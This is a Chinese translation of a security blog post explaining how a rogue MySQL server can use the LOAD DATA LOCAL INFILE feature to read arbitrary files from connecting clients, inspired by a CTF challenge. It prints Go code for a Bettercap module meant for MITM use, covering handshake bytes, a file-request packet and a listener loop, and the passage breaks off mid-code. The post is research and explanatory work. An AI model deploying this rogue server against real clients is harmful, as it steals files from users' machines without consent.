# 如何利用MySQL LOCAL INFILE读取客户端文件
##### 译文声明
本文是翻译文章，文章来源：https://w00tsec.blogspot.co.uk/
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
最近一段时间，我忙着跟[TheGoonies](https://twitter.com/thegooniesctf)小伙伴们参加[VolgaCTF 2018
CTF](https://ctftime.org/event/539/tasks/)比赛。其中有一道非常有趣的Web挑战题，我们没有在比赛中顺利解开。第二天我阅读了这道题的[write-up](https://github.com/balsn/ctf_writeup/tree/master/20180324-volgactf#corp-monitoring-unsolved-written-by-bookgin-special-thanks-to-admin-aleksey)，学到了一种非常酷的技术，可以通过`LOAD DATA INFILE`语句直接攻击MySQL客户端。
“[Corp Monitoring](https://ctftime.org/task/5642)”任务中包含一个Corporate Monitoring
API，可以验证某个服务器的FTP、Web以及MySQL服务是否在线，以测试指定的某个服务器的健康状态。连接MySQL的用户存在限制条件，我们可以根据某些查询语句（比如`SHOW
DATABASE`命令）来检查该服务的健康状态。
解决这个挑战的关键在于确定`Can Use LOAD DATA LOCAL`客户端的功能，将API指向一个恶意MySQL服务器，通过`LOAD DATA
INFILE`语句读取客户端上的任意文件。
读完write-up后，我决定检查哪些库、客户端以及Web框架可以利用这个技术。此外，我还编写了一个Bettercap模块，可以配合MITM攻击方法来滥用这个功能。
## 二、已有研究成果
在开始介绍之前，我得跟大家说明这并不是一项新的技术：这是MySQL客户端的一种已知技术，并且已经有了相关文档。我收集了先前的一些文章、工具以及演示文档，但这些资料都使用俄语编写，貌似大家并不是特别了解这些技术。
我收集的资料如下：
  * [Database Honeypot by design](https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927) – Yuri Goltsev的演示文稿（2013年8月）
  * [Rogue-MySql-Server Tool](https://github.com/allyshka/Rogue-MySql-Server) – 伪造的MySQL服务器，可以读取已连接客户端的文件（2013年9月）
  * [MySQL connect file read](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/) – Russian Security的一篇文章（2016年4月）
  * 
## 三、回顾MySQL LOAD DATA INFILE
根据MySQL的[官方文档](https://dev.mysql.com/doc/internals/en/connection-phase.html)，连接握手阶段中会执行如下操作：
  * 客户端和服务端交换各自功能
  * 如果需要则创建SSL通信通道
  * 服务端认证客户端身份
身份认证通过后，客户端会在实际操作之前发送请求，等待服务器的响应。“Client Capabilities”报文中包括名为`Can Use LOAD
DATA LOCAL`的一个条目：
从现在起事情变得有趣起来。一旦客户端启用了这个功能（比如通过`--enable-local-infile`标志），文件就可以从运行MySQL客户端的那台主机中读取并传输到远程服务器上。
MySQL协议中比较特别的一点就是客户端并不会去记录已请求的命令，而是根据服务器的响应来执行查询。
这意味着恶意MySQL服务器可以模拟初始握手过程，等待SQL语句数据包，忽略这个数据包然后响应一个`LOCAL DATA
INFILE`请求。是不是觉得非常酷？
为了利用这个功能，客户端至少还需要向我们的恶意MySQL服务器发出一个查询请求。幸运的是，大多数MySQL客户端以及程序库都会在握手之后至少发送一次请求，以探测目标平台的指纹信息，比如（`select
@[@version_comment](https://github.com/version_comment "@version_comment")
limit 1`）。
由于大多数MySQL客户端并没有强制使用加密，因此我们很容易就可以使用类似[Bettercap](https://github.com/bettercap/bettercap)之类的工具来模拟一个MySQL服务器。客户端并不关心通信的完整性以及真实性。
## 四、MITM + Bettercap + 恶意MySQL服务器
[Bettercap](https://github.com/bettercap/bettercap)就像是网络攻击以及监控的瑞士军刀。该工具支持多种[模块](https://github.com/bettercap/bettercap/tree/master/modules)，比如ARP/DNS欺骗、TCP以及数据包代理等。我快速查看了该工具中模块的工作原理，构造了一个比较简单的MySQL服务器，可以滥用`LOAD
DATA LOCAL INFILE`功能来读取客户端文件。
首先，当客户端连接并请求读取`LOCAL
INFILE`时，我嗅探了该过程的MySQL流量。我将服务器的响应数据以字节数组形式导出，使用Go语言代码定义了一些组件：
    MySQLGreeting := []byte{
        0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,
        0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,
        0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,
        0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,
        0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,
        0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,
        0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,
        0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,
        0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,
        0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,
        0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00,
    }
    FirstResponseOK := []byte{
        0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,
        0x00, 0x00, 0x00,
    }
    FileNameLength := byte(len(mysql.infile) + 1)
    GetFile := []byte{
        FileNameLength, 0x00, 0x00, 0x01, 0xfb,
    }
    GetFile = append(GetFile, mysql.infile...)
    SecondResponseOK := []byte{
        0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,
        0x00, 0x00, 0x00,
    }
编写Bettercap模块非常简单，恶意MySQL服务器的关键代码如下所示：
    for mysql.Running() {
        // tcp listener
        conn, err := mysql.listener.AcceptTCP()
        if err != nil {
            log.Warning("Error while accepting TCP connection: %s", err)
            continue
        }
        // send the mysql greeting
        conn.Write([]byte(MySQLGreeting))
        // read the incoming responses and retrieve infile
        // TODO: include binary support and files > 16kb
        b := make([]byte, 16384)
        bufio.NewReader(conn).Read(b)
        // parse client capabilities and validate connection
        // TODO: parse mysql connections properly and
        //       display additional connection attributes
        clientCapabilities := fmt.Sprintf("%08b", (int(uint32(b[4]) | uint32(b[5])<<8)))
        if len(clientCapabilities) == 16 {
        remoteAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
        log.Info("MySQL connection from: %s", remoteAddress)